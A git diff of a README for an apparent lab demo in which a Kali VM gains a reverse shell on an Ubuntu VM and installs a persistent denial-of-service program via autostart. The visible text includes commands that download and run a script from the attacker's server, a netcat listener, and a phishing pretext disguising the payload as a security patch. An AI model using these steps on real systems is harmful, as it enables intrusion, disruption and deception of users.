@@ -7,7 +7,7 @@
 
 The goal of the demo is to create a persistent Denial of Service on an Ubuntu virtual machine, which will therefore be the attacked machine, while a Kali virtual machine was used for the attacker. To do this, a reverse shell is first created to allow the attacking machine to act freely on the Ubuntu machine.
 
-## Kali Preparation
+### Kali Preparation
 First of all, all the necessary files were created on Kali.  
 First, the `reverseshell.sh` file, where the [payload](https://swisskyrepo.github.io/InternalAllTheThings/cheatsheets/shell-reverse-cheatsheet/) is in python 
 ```py
@@ -53,14 +53,14 @@ Once the files were created, a [web file server](https://medium.com/@jbtechmaven
 
 At this point, the only thing left to do is to listen on the chosen port, to do this it was used [netcat](https://www.geeksforgeeks.org/how-to-create-reverse-shells-with-netcat-in-kali-linux/), with the command: `nc -lvp 4444 -n`
 
-# Reverse shell 
+## Reverse shell 
 
 To create the reverse shell, it is necessary for the user on the attacked machine to be convinced to download and execute the `reverseshell.sh` file, this could be done by creating a phishing email and convincing him, for example, that it is a security patch. In the demo, the command `curl -O "http://10.0.2.2/demo/reverseshell.sh"` is used, which downloads the file from the web file server created on Kali. At this point the command `sudo chmod +x reverseshell.sh` is executed which adds the execution permission to the file with administrator privileges. Finally the file is executed with `./reverseshell.sh`.  
 Now, being the reverse shell executed in the background, the user on Ubuntu can continue to use the terminal normally, without noticing anything, but in reality he is connected on port 4444 to the Kali machine through a reverse shell.
 
 ![Reverse Shell](images/kali-ubuntu-rs.png)
 
-# DoS and persistence
+## DoS and persistence
 
 Using the reverse shell, now, it is easy to download the `dos.c` program and the `dos.desktop` file from the Kali web file server always using the `curl` command:  
 `curl -O "http://10.0.2.2/demo/dos.c"`  
@@ -78,7 +78,7 @@ Furthermore, another interesting feature is that, trying to remove `dos` using t
 To stop this attack you might think of deleting the `dos` executable, but in case it is placed in a folder not easily reachable, this could not be done, especially if you do not know what is happening and if the machine starts to crash.  
 Alternatively, you could think of deleting the `dos.desktop` file, but given that it is located in a directory that is hidden by default and given that the terminal is unusable, this could be difficult.
 
-## References
+### References
 1. The payload for the reverse shell was taken from: https://swisskyrepo.github.io/InternalAllTheThings/cheatsheets/shell-reverse-cheatsheet/
 2. The creation of the web file server was taken from: https://medium.com/@jbtechmaven/ethical-hacking-reverse-shell-attack-using-metasploit-57e9cd400c88
 3. The usage of netcat to make the machine listen on a prefefined port was taken from: https://www.geeksforgeeks.org/how-to-create-reverse-shells-with-netcat-in-kali-linux/
